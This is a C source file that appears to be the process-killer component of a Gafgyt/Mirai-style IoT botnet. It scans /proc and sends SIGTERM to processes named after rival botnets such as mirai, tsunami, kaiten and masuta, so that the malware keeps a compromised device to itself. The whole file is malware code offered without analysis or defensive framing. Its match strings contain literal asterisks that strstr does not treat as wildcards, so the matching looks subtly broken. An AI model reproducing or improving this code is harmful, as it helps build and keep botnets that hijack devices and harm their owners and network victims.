#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <ctype.h>
#include <signal.h>
#include <linux/limits.h>
#include <stddef.h>
#include <stdint.h>
#include <errno.h>
#include "headers/killer.h"

const char *GAFGYT_PROCS[GAFGYT_COUNT] = {
    "yakuza*",
    "axis*",
    "sora*",
    "condi*",
    "mirai*",
    "tsunami*",
    "kaiten*",
    "hajime*",
    "masuta*",
    "josho*",
};

void start_killer(void) {
    DIR *dir = NULL;
    struct dirent *entry = NULL;
    char path[PATH_MAX] = {0};
    char line[256] = {0};
    FILE *f = NULL;
    
    dir = opendir("/proc");
    if (!dir) return;

    while ((entry = readdir(dir)) != NULL) {
        if (!entry->d_name || !isdigit(entry->d_name[0])) {
            continue;
        }
        
        size_t name_len = strlen(entry->d_name);
        if (name_len == 0 || name_len > 32) {
            continue;
        }
        
        memset(path, 0, PATH_MAX);
        memset(line, 0, sizeof(line));
        
        int path_len = snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
        if (path_len < 0 || (size_t)path_len >= sizeof(path)) {
            continue;
        }
        
        f = fopen(path, "r");
        if (!f) {
            continue;
        }

        if (fgets(line, sizeof(line), f)) {
            char *newline = strchr(line, '\n');
            if (newline) {
                *newline = '\0';
            }
            
            if (line[0] != '\0') {
                for (size_t i = 0; i < GAFGYT_COUNT; i++) {
                    if (strstr(line, GAFGYT_PROCS[i])) {
                        char *endptr = NULL;
                        errno = 0;
                        long pid_val = strtol(entry->d_name, &endptr, 10);
                        
                        if (errno == 0 && endptr != entry->d_name && 
                            *endptr == '\0' && pid_val > 0 && 
                            pid_val <= PID_MAX) {
                            
                            kill((pid_t)pid_val, SIGTERM);
                        }
                        break;
                    }
                }
            }
        }
        
        fclose(f);
        f = NULL;
    }
    
    if (dir) {
        closedir(dir);
    }
}

void stop_killer(void) {
    //NOOP
    // No-op in simple killer
}
